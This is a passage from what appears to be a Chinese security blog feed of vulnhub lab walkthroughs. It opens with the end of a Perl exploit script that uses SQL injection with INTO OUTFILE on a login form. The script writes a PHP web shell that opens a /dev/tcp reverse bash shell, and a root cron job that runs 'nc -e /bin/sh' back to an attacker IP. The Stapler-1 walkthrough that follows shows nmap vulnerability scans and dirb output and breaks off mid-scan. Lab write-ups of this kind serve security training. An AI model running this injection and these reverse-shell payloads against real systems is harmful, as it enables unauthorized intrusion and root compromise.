class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$ip</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$ip</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nEnter the port to connect back on (e.g.: 4444)&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=&lt;STDIN&gt;;</span><br><span class="line">chomp(<span class="variable">$port</span>);</span><br><span class="line"> </span><br><span class="line">menu:;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n[+] Main Menu:\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;    1. Limited Shell\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;    2. Root Shell.\n&quot;</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;    3. Exit.\n&quot;</span>    ;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&gt; &quot;</span>;</span><br><span class="line"><span class="variable">$option</span>=&lt;STDIN&gt;;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>!=1 &amp;&amp; <span class="variable">$option</span>!=2 &amp;&amp; <span class="variable">$option</span>!=3)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Oups, wrong option.\nPlease, try again.\n&quot;</span>;</span><br><span class="line">goto menu;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>==1)</span><br><span class="line">&#123;&amp;<span class="built_in">limit</span>&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>==2)</span><br><span class="line">&#123;&amp;root&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>==3)</span><br><span class="line">&#123;&amp;quit&#125;</span><br><span class="line"> </span><br><span class="line">sub <span class="built_in">limit</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$payload</span> =</span><br><span class="line">    <span class="string">&quot;&lt;?php &quot;</span>.</span><br><span class="line">    <span class="string">&quot;system(&#x27;/bin/bash -i &gt; /dev/tcp/<span class="variable">$ip</span>/<span class="variable">$port</span> 0&lt;&amp;1 2&gt;&amp;1&#x27;);&quot;</span>.</span><br><span class="line">    <span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#Encode the payload to Hex.</span></span><br><span class="line">    <span class="variable">$payload</span> =~ s/(.)/sprintf(<span class="string">&quot;%x&quot;</span>,ord(<span class="variable">$1</span>))/eg;</span><br><span class="line">    <span class="variable">$payload</span> =<span class="string">&quot;0x&quot;</span>.<span class="string">&quot;<span class="variable">$payload</span>&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;t3hpWn.php&quot;</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="string">&quot;/var/www/&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$nc</span>= <span class="string">&quot;nc -lvp <span class="variable">$port</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\n[+] Wait for reverse connection on port <span class="variable">$port</span>...\n&quot;</span>;</span><br><span class="line">    system(<span class="string">&quot;xterm -e <span class="variable">$nc</span> &amp;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Uploading the backdoor to server... \n&quot;</span>;</span><br><span class="line">    <span class="variable">$junk</span>=<span class="string">&quot;&#x27;&#x27;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;&#x27; OR 1=1 UNION SELECT <span class="variable">$payload</span>,<span class="variable">$junk</span>,<span class="variable">$junk</span> INTO OUTFILE &#x27;&quot;</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27; #&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$ua</span> = LWP::UserAgent-&gt;new or die;</span><br><span class="line">    <span class="variable">$req</span> = HTTP::Request-&gt;new(POST =&gt; <span class="variable">$target</span>.<span class="string">&quot;/checklogin.php&quot;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content_type(<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content(<span class="string">&quot;myusername=&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&amp;mypassword=&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&amp;Submit=Login&quot;</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$ua</span>-&gt;request(<span class="variable">$req</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(10);</span><br><span class="line">    <span class="variable">$int</span> = LWP::UserAgent-&gt;new() or die;</span><br><span class="line">    <span class="variable">$check</span>=<span class="variable">$int</span>-&gt;get(<span class="variable">$target</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check</span>-&gt;content =~ m/was not found/g)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[-] Failed to upload the backdoor!\n\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    goto menu;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">sub root</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"># --------------------------------------------------------------</span></span><br><span class="line">    <span class="comment"># Thanks to g0tmi1k for this local privilege escalation trick.</span></span><br><span class="line">    <span class="comment"># --------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line">    <span class="variable">$payload</span> =<span class="string">&quot;* * * * * root /bin/nc.traditional <span class="variable">$ip</span> <span class="variable">$port</span> -e /bin/sh &quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#Encode the payload to Hex.</span></span><br><span class="line">    <span class="variable">$payload</span> =~ s/(.)/sprintf(<span class="string">&quot;%x&quot;</span>,ord(<span class="variable">$1</span>))/eg;</span><br><span class="line">    <span class="variable">$payload</span> =<span class="string">&quot;0x&quot;</span>.<span class="string">&quot;<span class="variable">$payload</span>&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;g0tr00t&quot;</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="string">&quot;/etc/cron.d/&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$nc</span>= <span class="string">&quot;nc -lvp <span class="variable">$port</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\n[+] Wait for reverse connection on port <span class="variable">$port</span>...\n&quot;</span>;</span><br><span class="line">    system(<span class="string">&quot;xterm -e <span class="variable">$nc</span> &amp;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Uploading the backdoor to server... \n&quot;</span>;</span><br><span class="line">    <span class="variable">$junk</span>=<span class="string">&quot;&#x27;&#x27;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;&#x27; AND 1=1 union select <span class="variable">$payload</span>,<span class="variable">$junk</span>,<span class="variable">$junk</span> INTO OUTFILE &#x27;&quot;</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27; #&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$ua</span> = LWP::UserAgent-&gt;new or die;</span><br><span class="line">    <span class="variable">$req</span> = HTTP::Request-&gt;new(POST =&gt; <span class="variable">$target</span>.<span class="string">&quot;/checklogin.php&quot;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content_type(<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content(<span class="string">&quot;myusername=&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&amp;mypassword=&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&amp;Submit=Login&quot;</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$ua</span>-&gt;request(<span class="variable">$req</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(60);</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Check the xterm window for the root shell... \n&quot;</span>;</span><br><span class="line">    goto menu;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">sub quit</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Stapler-1]</title>
    <url>/2020/04/13/Stapler-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Stapler: 1<br>发布日期：2016年6月8日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Stapler.zip</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdGFwbGVyL1N0YXBsZXIuemlw">https://download.vulnhub.com/stapler/Stapler.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdGFwbGVyL1N0YXBsZXIuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/stapler/Stapler.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">+---------------------------------------------------------+</span><br><span class="line">|                                                         |</span><br><span class="line">|                                  __..--<span class="string">&#x27;&#x27;</span>\              |</span><br><span class="line">|                          __..--<span class="string">&#x27;&#x27;</span>         \             |</span><br><span class="line">|                  __..--<span class="string">&#x27;&#x27;</span>          __..--<span class="string">&#x27;&#x27;</span>             |</span><br><span class="line">|          __..--<span class="string">&#x27;&#x27;</span>          __..--<span class="string">&#x27;&#x27;</span>       |             |</span><br><span class="line">|          \ o        __..--<span class="string">&#x27;&#x27;</span>____....----<span class="string">&quot;&quot;</span>              |</span><br><span class="line">|           \__..--<span class="string">&#x27;&#x27;</span>\                                    |</span><br><span class="line">|           |         \                                   |</span><br><span class="line">|          +----------------------------------+           |</span><br><span class="line">|          +----------------------------------+           |</span><br><span class="line">|                                                         |</span><br><span class="line">+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+</span><br><span class="line">|   名称: Stapler           |          IP: DHCP           |</span><br><span class="line">|   日期: 2016-June-08      |        目标: Get Root!      |</span><br><span class="line">|   作者: g0tmi1k           |        难度: ??? ;)         |</span><br><span class="line">+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+</span><br><span class="line">|                                                         |</span><br><span class="line">| + 一般的初级/中级虚拟机，只有几个拐点                      |</span><br><span class="line">|   + 可能会觉得容易/困难(取决于你的水平)                    |</span><br><span class="line">|   + ...还有攻击box的方式                                 |</span><br><span class="line">|                                                         |</span><br><span class="line">| + 它应该在VMware和Virtualbox上都能工作                    |</span><br><span class="line">|   + 如果更改了网络模式，请重新启动VM                       |</span><br><span class="line">|   + Fusion用户，需要在导入时重试                          |</span><br><span class="line">|                                                         |</span><br><span class="line">| + 有多种方法来执行此机器                                  |</span><br><span class="line">|   + 至少有两(2)条路径可以得到有限制的shell                 |</span><br><span class="line">|   + 至少有三种方法可以获得root访问权                       |</span><br><span class="line">|                                                         |</span><br><span class="line">| + 为2016年伦敦BsidesLondon定制                           |</span><br><span class="line">|   + Slides: https://download.vulnhub.com/media/stapler/ |</span><br><span class="line">|                                                         |</span><br><span class="line">| + Thanks g0tmi1k, nullmode, rasta_mouse &amp; superkojiman  |</span><br><span class="line">|   + …向VulnHub-CTF团队大喊一声=)        |</span><br><span class="line">|                                                         |</span><br><span class="line">+- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+</span><br><span class="line">|                                                         |</span><br><span class="line">|       --[[~~Enjoy. Have fun. Happy Hacking.~~]]--       |</span><br><span class="line">|                                                         |</span><br><span class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.122</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 08:00:27:03:5A:E4 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.56.122</span></span><br><span class="line">PORT      STATE  SERVICE     VERSION</span><br><span class="line">20/tcp    closed ftp-data</span><br><span class="line">21/tcp    open   ftp         vsftpd 2.0.8 or later</span><br><span class="line">22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp    open   domain      dnsmasq 2.75</span><br><span class="line">80/tcp    open   http        PHP cli server 5.5 or later</span><br><span class="line">123/tcp   closed ntp</span><br><span class="line">137/tcp   closed netbios-ns</span><br><span class="line">138/tcp   closed netbios-dgm</span><br><span class="line">139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">666/tcp   open   doom?</span><br><span class="line">3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1</span><br><span class="line">12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -T4 -v --script=vuln -p 21,22,53,80,139,666,3306,12380 192.168.56.122</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">53/tcp    open  domain      dnsmasq 2.75</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp    open  http        PHP cli server 5.5 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">666/tcp   open  doom?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     message2.jpgUT </span><br><span class="line">|     QWux</span><br><span class="line">|     <span class="string">&quot;DL[E</span></span><br><span class="line"><span class="string">|     #;3[</span></span><br><span class="line"><span class="string">|     \xf6</span></span><br><span class="line"><span class="string">|     u([r</span></span><br><span class="line"><span class="string">|     qYQq</span></span><br><span class="line"><span class="string">|     Y_?n2</span></span><br><span class="line"><span class="string">|     3&amp;M~&#123;</span></span><br><span class="line"><span class="string">|     9-a)T</span></span><br><span class="line"><span class="string">|     L&#125;AJ</span></span><br><span class="line"><span class="string">|_    .npy.9</span></span><br><span class="line"><span class="string">3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 3.X|4.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span></span><br><span class="line"><span class="string">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 4.4</span></span><br><span class="line"><span class="string">Uptime guess: 0.016 days (since Mon Apr 13 03:19:38 2020)</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">TCP Sequence Prediction: Difficulty=259 (Good luck!)</span></span><br><span class="line"><span class="string">IP ID Sequence Generation: All zeros</span></span><br><span class="line"><span class="string">Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">| smb-vuln-cve2009-3103: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2009-3103</span></span><br><span class="line"><span class="string">|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,</span></span><br><span class="line"><span class="string">|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a</span></span><br><span class="line"><span class="string">|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE</span></span><br><span class="line"><span class="string">|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,</span></span><br><span class="line"><span class="string">|           aka &quot;</span>SMBv2 Negotiation Vulnerability.<span class="string">&quot;</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-08</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span></span><br><span class="line"><span class="string">|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: false</span></span><br><span class="line"><span class="string">| smb-vuln-regsvc-dos: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span></span><br><span class="line"><span class="string">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span></span><br><span class="line"><span class="string">|       while working on smb-enum-sessions.</span></span><br><span class="line"><span class="string">|_</span></span><br></pre></td></tr></table></figure>

<p>dirb扫一波12380端口的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb https://192.168.56.122:12380/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Apr 13 22:11:33 2020</span><br><span class="line">URL_BASE: https://192.168.56.122:12380/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: https://192.168.56.122:12380/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/announcements/                                                                </span><br><span class="line">+ https://192.168.56.122:12380/index.html (CODE:200|SIZE:21)                                                              </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/javascript/                                                                   </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/                                                                   </span><br><span class="line">+ https://192.168.56.122:12380/robots.txt (CODE:200|SIZE:59)                                                              </span><br><span class="line">+ https://192.168.56.122:12380/server-status (CODE:403|SIZE:305)                                                          </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/announcements/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/javascript/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/javascript/jquery/                                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/doc/                                                               </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                               </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/index.php (CODE:200|SIZE:10332)                                                 </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/js/                                                                </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/libraries (CODE:403|SIZE:312)                                                   </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/                                                            </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/phpinfo.php (CODE:200|SIZE:10334)                                               </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/setup (CODE:401|SIZE:464)                                                       </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/sql/                                                               </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/                                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/javascript/jquery/ ----</span><br><span class="line">+ https://192.168.56.122:12380/javascript/jquery/jquery (CODE:200|SIZE:284394)                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/doc/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/doc/html/                                                          </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/js/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/js/jquery/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/js/transformations/                                                </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/az/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/<span class="built_in">bg</span>/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ca/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/cs/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/da/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/de/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/el/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/es/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/et/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/<span class="keyword">fi</span>/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/fr/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/gl/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/hu/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ia/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/id/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/it/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ja/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ko/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/lt/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/nl/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/pl/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/pt/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/pt_BR/                                                      </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ro/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ru/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/si/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sk/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sl/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sq/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sv/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/tr/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/uk/                                      